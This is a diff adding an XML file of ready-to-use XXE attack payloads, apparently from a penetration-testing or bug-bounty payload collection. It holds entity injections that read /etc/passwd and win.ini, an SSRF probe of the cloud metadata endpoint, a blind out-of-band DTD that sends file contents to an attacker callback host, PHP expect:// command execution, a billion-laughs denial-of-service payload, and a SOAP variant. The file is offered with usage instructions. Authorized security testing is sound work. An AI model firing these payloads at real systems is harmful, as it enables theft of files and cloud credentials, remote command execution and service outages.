@@ -1,0 +1,55 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  XXE Payloads
+  Usage: submit as XML input, file upload, or API body
+  Replace CALLBACK with your Interactsh / Collaborator URL
+-->
+
+<!-- 1. Classic file read -->
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+
+<!-- 2. Windows file read -->
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">]>
+<foo>&xxe;</foo>
+
+<!-- 3. SSRF via XXE (HTTP request to internal) -->
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+<foo>&xxe;</foo>
+
+<!-- 4. Blind OOB via DTD (use your callback URL) -->
+<!DOCTYPE foo [
+  <!ENTITY % remote SYSTEM "https://CALLBACK/evil.dtd">
+  %remote;
+]>
+<foo>&send;</foo>
+
+<!-- Contents of evil.dtd (host on your server):
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % wrap "<!ENTITY send SYSTEM 'https://CALLBACK/?x=%file;'>">
+%wrap;
+-->
+
+<!-- 5. PHP expect:// (requires expect module) -->
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
+<foo>&xxe;</foo>
+
+<!-- 6. Billion laughs DoS (do NOT use in bug bounty without permission) -->
+<!--
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ELEMENT lolz (#PCDATA)>
+  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+]>
+<lolz>&lol3;</lolz>
+-->
+
+<!-- 7. SOAP XXE -->
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+  <soapenv:Body>
+    <foo>&xxe;</foo>
+  </soapenv:Body>
+</soapenv:Envelope>
